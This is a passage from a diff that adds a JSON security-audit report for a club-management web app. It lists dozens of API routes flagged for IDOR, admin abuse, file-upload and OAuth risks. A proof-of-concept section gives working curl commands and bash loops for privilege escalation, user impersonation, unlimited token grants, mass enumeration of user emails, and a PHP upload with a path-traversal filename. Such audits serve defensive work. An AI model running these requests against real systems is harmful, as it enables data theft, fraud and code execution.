+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/admin/clubs/<int:club_id>/transactions",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_create_club_transaction",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/pizza-grants",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "club_pizza_grants",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/projects",
+        "methods": [
+          "GET"
+        ],
+        "function": "club_projects",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/resources",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "club_resources",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/posts/<int:post_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "club_post_detail",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/assignments/<int:assignment_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "club_assignment_detail",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/resources/<int:resource_id>",
+        "methods": [
+          "PUT",
+          "DELETE"
+        ],
+        "function": "club_resource_detail",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/members",
+        "methods": [
+          "GET"
+        ],
+        "function": "get_club_members",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/members/<int:user_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "remove_club_member",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/co-leader",
+        "methods": [
+          "POST",
+          "DELETE"
+        ],
+        "function": "make_co_leader",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/remove-co-leader",
+        "methods": [
+          "POST"
+        ],
+        "function": "remove_co_leader",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/settings",
+        "methods": [
+          "PUT"
+        ],
+        "function": "update_club_settings",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/update-email",
+        "methods": [
+          "POST"
+        ],
+        "function": "update_club_email",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/transfer-leadership",
+        "methods": [
+          "POST"
+        ],
+        "function": "transfer_leadership",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/grant-submissions",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "club_grant_submissions",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/clubs/<int:club_id>/purchase-requests",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "club_purchase_requests",
+        "vulnerability": "Potential IDOR",
+        "impact": "Unauthorized access to club resources"
+      },
+      {
+        "route": "/api/admin/users/<int:user_id>",
+        "methods": [
+          "GET",
+          "PUT",
+          "DELETE"
+        ],
+        "function": "admin_manage_user",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/clubs",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_create_club",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/clubs/<int:club_id>",
+        "methods": [
+          "PUT",
+          "DELETE"
+        ],
+        "function": "admin_manage_club",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/clubs/<int:club_id>/transfer-leadership",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_transfer_club_leadership",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/reset-password/<int:user_id>",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_reset_password",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/users/<int:user_id>/suspend",
+        "methods": [
+          "PUT"
+        ],
+        "function": "admin_suspend_user",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/sync-clubs-airtable",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_sync_clubs_airtable",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/leaderboard/exclusions",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_add_leaderboard_exclusion",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/leaderboard/exclusions/<int:exclusion_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "admin_remove_leaderboard_exclusion",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/api-keys",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_create_api_key",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/api-keys/<int:key_id>",
+        "methods": [
+          "PUT",
+          "DELETE"
+        ],
+        "function": "admin_manage_api_key",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/oauth-applications",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_create_oauth_app",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/oauth-applications/<int:app_id>",
+        "methods": [
+          "PUT",
+          "DELETE"
+        ],
+        "function": "admin_manage_oauth_app",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/pizza-grants/review",
+        "methods": [
+          "POST"
+        ],
+        "function": "admin_review_pizza_grant",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/admin/pizza-grants/<string:submission_id>",
+        "methods": [
+          "DELETE"
+        ],
+        "function": "admin_delete_pizza_grant",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      },
+      {
+        "route": "/api/v1/users/<int:user_id>",
+        "methods": [
+          "GET"
+        ],
+        "function": "api_get_user",
+        "vulnerability": "User IDOR",
+        "impact": "Information disclosure"
+      },
+      {
+        "route": "/admin/api/settings",
+        "methods": [
+          "POST"
+        ],
+        "function": "update_setting",
+        "vulnerability": "Admin privilege abuse",
+        "impact": "Data manipulation, system changes"
+      }
+    ],
+    "medium": [
+      {
+        "route": "/api/club/<int:club_id>/chat/upload-image",
+        "methods": [
+          "POST"
+        ],
+        "function": "upload_chat_image",
+        "vulnerability": "File upload vulnerability",
+        "impact": "Potential file upload attacks"
+      },
+      {
+        "route": "/api/upload-screenshot",
+        "methods": [
+          "POST"
+        ],
+        "function": "upload_screenshot",
+        "vulnerability": "File upload vulnerability",
+        "impact": "Potential file upload attacks"
+      },
+      {
+        "route": "/api/upload-images",
+        "methods": [
+          "POST"
+        ],
+        "function": "upload_images",
+        "vulnerability": "File upload vulnerability",
+        "impact": "Potential file upload attacks"
+      },
+      {
+        "route": "/api/blog/upload-images",
+        "methods": [
+          "POST"
+        ],
+        "function": "upload_blog_images",
+        "vulnerability": "File upload vulnerability",
+        "impact": "Potential file upload attacks"
+      },
+      {
+        "route": "/oauth/authorize",
+        "methods": [
+          "GET",
+          "POST"
+        ],
+        "function": "oauth_authorize",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/token",
+        "methods": [
+          "POST"
+        ],
+        "function": "oauth_token",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/user",
+        "methods": [
+          "GET"
+        ],
+        "function": "oauth_user",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/user/clubs",
+        "methods": [
+          "GET"
+        ],
+        "function": "oauth_user_clubs",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/user/projects",
+        "methods": [
+          "GET"
+        ],
+        "function": "oauth_user_projects",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/user/assignments",
+        "methods": [
+          "GET"
+        ],
+        "function": "oauth_user_assignments",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/user/meetings",
+        "methods": [
+          "GET"
+        ],
+        "function": "oauth_user_meetings",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/debug",
+        "methods": [
+          "GET"
+        ],
+        "function": "oauth_debug",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      },
+      {
+        "route": "/oauth/debug/callback",
+        "methods": [
+          "GET"
+        ],
+        "function": "oauth_debug_callback",
+        "vulnerability": "OAuth security",
+        "impact": "Authentication bypass potential"
+      }
+    ]
+  },
+  "proof_of_concepts": {
+    "privilege_escalation": {
+      "title": "Admin Role Assignment (Privilege Escalation)",
+      "severity": "CRITICAL",
+      "endpoint": "POST /api/admin/administrators",
+      "description": "Any admin can promote any user to admin status without additional verification",
+      "poc": "\n# Prerequisites: Valid admin session or API key\n# Step 1: Find target user email\ncurl 'https://club-dashboard.com/api/admin/users/search?q=victim' \\\n  -H 'Authorization: Bearer ADMIN_API_KEY'\n\n# Step 2: Promote user to admin\ncurl -X POST 'https://club-dashboard.com/api/admin/administrators' \\\n  -H 'Authorization: Bearer ADMIN_API_KEY' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\": \"victim@example.com\"}'\n\n# Result: User becomes admin with full system access\n            ",
+      "impact": "Complete system compromise, all data accessible"
+    },
+    "admin_impersonation": {
+      "title": "Admin User Impersonation",
+      "severity": "CRITICAL",
+      "endpoint": "POST /api/admin/login-as-user/<user_id>",
+      "description": "Admins can login as any non-admin user without consent",
+      "poc": "\n# Prerequisites: Admin session\n# Step 1: Find target user ID\ncurl 'https://club-dashboard.com/api/admin/users' \\\n  -H 'Cookie: session=admin_session_cookie'\n\n# Step 2: Login as target user\ncurl -X POST 'https://club-dashboard.com/api/admin/login-as-user/123' \\\n  -H 'Cookie: session=admin_session_cookie' \\\n  -H 'Content-Type: application/json'\n\n# Result: Session now belongs to target user\n# Admin can access user's private data, make changes on their behalf\n            ",
+      "impact": "Account takeover, privacy violation, impersonation"
+    },
+    "token_manipulation": {
+      "title": "Financial Token Manipulation",
+      "severity": "CRITICAL",
+      "endpoint": "POST /api/v1/admin/clubs/<club_id>/tokens/grant",
+      "description": "Unlimited token grants without proper financial controls",
+      "poc": "\n# Prerequisites: Admin API key with clubs:write scope\n# Step 1: Create or identify target club\ncurl -X POST 'https://club-dashboard.com/api/admin/clubs' \\\n  -H 'Authorization: Bearer ADMIN_API_KEY' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"name\": \"Exploit Club\", \"description\": \"Test\", \"location\": \"Test\"}'\n\n# Step 2: Grant massive token amounts  \ncurl -X POST 'https://club-dashboard.com/api/v1/admin/clubs/1/tokens/grant' \\\n  -H 'Authorization: Bearer ADMIN_API_KEY' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"amount\": 99999, \"description\": \"Financial exploitation\"}'\n\n# Result: Club receives 99,999 tokens ($999.99 value)\n# Can be repeated for unlimited financial gain\n            ",
+      "impact": "Financial fraud, economic system manipulation"
+    },
+    "idor_club_access": {
+      "title": "Club Resource IDOR",
+      "severity": "HIGH",
+      "endpoint": "GET /api/clubs/<club_id>/*",
+      "description": "Access any club's private resources by manipulating club_id",
+      "poc": "\n# Prerequisites: Valid user session\n# Step 1: Access own club resources (authorized)\ncurl 'https://club-dashboard.com/api/clubs/1/posts' \\\n  -H 'Cookie: session=user_session'\n\n# Step 2: Access other clubs by changing ID (unauthorized)\nfor club_id in {1..100}; do\n  curl \"https://club-dashboard.com/api/clubs/$club_id/posts\" \\\n    -H 'Cookie: session=user_session' \\\n    -s | grep -q \"posts\" && echo \"Club $club_id accessible\"\ndone\n\n# Result: Access to private club data, member lists, posts\n            ",
+      "impact": "Privacy violation, unauthorized data access"
+    },
+    "user_enumeration": {
+      "title": "User Information Disclosure",
+      "severity": "HIGH",
+      "endpoint": "GET /api/v1/users/<user_id>",
+      "description": "Enumerate and access user profiles without authorization",
+      "poc": "\n# Prerequisites: API key with users:read scope\n# Step 1: Enumerate valid user IDs\nfor user_id in {1..1000}; do\n  response=$(curl -s \"https://club-dashboard.com/api/v1/users/$user_id\" \\\n    -H 'Authorization: Bearer API_KEY')\n  if echo \"$response\" | grep -q \"username\"; then\n    echo \"User $user_id: $(echo \"$response\" | jq -r '.user.email')\"\n  fi\ndone\n\n# Result: Complete user database enumeration\n# Exposes emails, names, club memberships, creation dates\n            ",
+      "impact": "Mass data breach, user enumeration, privacy violation"
+    },
+    "file_upload_bypass": {
+      "title": "File Upload Security Bypass",
+      "severity": "MEDIUM",
+      "endpoint": "POST /api/upload-screenshot",
+      "description": "Potential file upload vulnerabilities and path traversal",
+      "poc": "\n# Prerequisites: Valid user session\n# Step 1: Test malicious file upload\ncurl -X POST 'https://club-dashboard.com/api/upload-screenshot' \\\n  -H 'Cookie: session=user_session' \\\n  -F 'screenshot=@malicious.php;type=image/png'\n\n# Step 2: Test path traversal in filename\ncurl -X POST 'https://club-dashboard.com/api/upload-screenshot' \\\n  -H 'Cookie: session=user_session' \\\n  -F 'screenshot=@test.png;filename=../../../malicious.php'\n\n# Potential Results: \n# - File upload to unintended locations\n# - Execution of malicious files\n# - Directory traversal attacks\n            ",
+      "impact": "Code execution, file system access, path traversal"
+    }
+  },
+  "summary": {
+    "critical_vulnerabilities": 7,
+    "high_risk_routes": 60,
+    "medium_risk_routes": 13,
+    "total_vulnerable_routes": 80
+  }
+}
